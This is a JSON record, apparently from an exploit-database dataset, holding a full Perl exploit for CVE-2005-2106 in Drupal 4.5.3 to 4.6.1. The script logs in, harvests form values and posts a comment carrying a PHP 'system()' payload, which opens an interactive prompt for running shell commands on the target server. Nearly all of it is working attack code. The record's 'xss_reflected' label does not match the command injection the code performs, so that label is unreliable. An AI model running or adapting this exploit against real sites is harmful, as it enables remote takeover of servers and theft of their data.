{
  "id": "1088",
  "title": "Drupal 4.5.3 &lt; 4.6.1 - Comments PHP Injection",
  "cve": "CVE-2005-2106",
  "vuln_type": "xss_reflected",
  "code": "#!/usr/bin/perl\r\n# Mon Jul  4 18:19:35 CEST 2005 dab@digitalsec.net\r\n#\r\n# DRUPAL-SA-2005-002 php injection in comments (yes, its lame)\r\n# Hax0r code here, read before execute\r\n#\r\n# Run without arguments to show the help.\r\n#\r\n# BLINK! BLINK! BLINK! BLINK!\r\n#\r\n# Feel free to port to another stupid script language (mIRC,\r\n# python, TCL or orthers), and send to securiteam (AGAIN)\r\n# \r\n# Theo, this one hasn't been tested in BSD.. yet!\r\n# infohacking: there're a lot of xss in drupal, contact me if you want \r\n# to program some exploits.\r\n#\r\n# BLINK! BLINK! BLINK! BLINK!\r\n#\r\n#\r\n# HERE YOU CAN PUT YOUR BANNER!!!! THOUSENDS OF PEOPLE IS READING THIS LINE\r\n# contact me for pricing and offerings.\r\n#\r\n# !dSR: yubiiiiii yeooooooooooo\r\n#\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\nuse LWP::Simple;\r\nuse HTTP::Request::Common \"POST\";\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\nuse strict;\r\n\r\n$| = 1; # ;1 = |$\r\n\r\nmy ($proxy,$proxy_user,$proxy_pass);\r\nmy ($host,$debug,$drupal_user,$drupal_pass);\r\nmy $options = GetOptions (\r\n  'host=s'\t\t     => \\$host, \r\n  'proxy=s'           => \\$proxy,\r\n  'proxy_user=s'      => \\$proxy_user,\r\n  'proxy_pass=s'      => \\$proxy_pass,\r\n  'drupal_user=s'      => \\$drupal_user,\r\n  'drupal_pass=s'      => \\$drupal_pass,\r\n\t'debug'         \t => \\$debug);\r\n\r\n&help unless ($host);\r\n\r\nwhile (1){\r\n    print \"druppy461\\$ \";\r\n    my $cmd = <STDIN>;\r\n    &druppy($cmd);\r\n}\r\nexit (1); # could be replaced with exit(2)\r\n\r\n\r\nsub druppy {\r\n    chomp (my $cmd = shift);\r\n    LWP::Debug::level('+') if $debug;\r\n\r\n    my $ua = new LWP::UserAgent(\r\n            cookie_jar=> { file => \"$$.cookie\" });   # this is a random feature\r\n    $ua->agent(\"Morzilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!\");\r\n\r\n    if ($drupal_user) { # no need to exploit \r\n        my ($mhost, $h);\r\n        if ($host =~ /(http:\\/\\/.*?)\\?q=/) {\r\n            $mhost = $1;\r\n            $h = $mhost . \"?q=user/login\";\r\n        } #some magic hacking here\r\n        else { \r\n            $host =~ /(.*?)\\/.*?\\//; $mhost =$1;\r\n            $h = $mhost . \"/user/login\";\r\n        }\r\n        print $h . \"\\n\" if $debug; \r\n        my $req = POST $h,[\r\n            'edit[name]' => \"$drupal_user\",\r\n            'edit[pass]' => \"$drupal_pass\"\r\n                ]; #grab these, and send to dsr!\r\n        print $req->as_string() if $debug;\r\n        my $res = $ua->request($req);\r\n        print $res->content() if $debug;\r\n        if ($res->is_redirect eq 1) {\r\n            print \"Logged\\n\" if $debug;\r\n        }\r\n    }\r\n\r\n    $ua->proxy(['http'] => $proxy) if $proxy;\r\n    my $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n    my $res = $ua->get(\"$host\");\r\n    my $html = $res->content();\r\n    my @op; # buffer overflow here\r\n    foreach (split(/\\n/,$html)) { \r\n        if ( m/name=\"op\" value=\"(.*?)\"/){\r\n            push(@op,$1);\r\n        }\r\n    }# xss here\r\n\r\n    my $ok = 0; # globlal for admin purposes\r\n    foreach my $op (@op) {\r\n        my $req = POST \"$host\",[\r\n            'edit[subject]' => 'test',\r\n            'edit[comment]' => \r\n             \"<?php print(\\\"BLAH\\\\n\\\");system(\\\"$cmd\\\"); print(\\\"BLAH\\\\n\\\");  php?>\",\r\n            'edit[format]' => '2',\r\n            'edit[cid]' => \"\", # drupal is sick.. it doesn't need arguments\r\n            'edit[pid]' => \"\", # they use it to grab some statistycal information\r\n            'edit[nid]' => \"\", # about users conduits. Don't buy in internet using drupal\r\n            'op' => \"$op\"\r\n                ];\r\n\r\n        print $req->as_string() if $debug;\r\n        my $res = $ua->request($req);\r\n        my $html = $res->content(); \r\n        print $html if $debug;\r\n        foreach (split(/\\n/,$html)) {\r\n            return if $ok gt \"1\";       # super hack de phrack\r\n            if (/BLAH/) { $ok++; next }\r\n            print \"$_\\n\" if $ok eq \"1\"; # /n is for another line in screen\r\n        }\r\n    }\r\n}\r\n\r\n\r\nsub help {\r\n    print \"Syntax: ./$0 <url> [options]\\n\";\r\n    print \"\\t--drupal_user, --drupal_pass  (needed if dont allow anonymous posts)\\n\";\r\n    print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n    print \"\\t--debug\\n\";\r\n    print \"\\nExample\\n\";\r\n    print \"bash# $0 --host=http://www.server.com/?q=comment/reply/1\\n\";\r\n    print \"\\n\";\r\n    exit(1);\r\n}\r\n\r\n\r\n#sub 0day_solaris {\r\n# please put your code here\r\n#}\r\n\r\n# milw0rm.com [2005-07-05]",
  "url": "https://www.exploit-db.com/exploits/1088"
}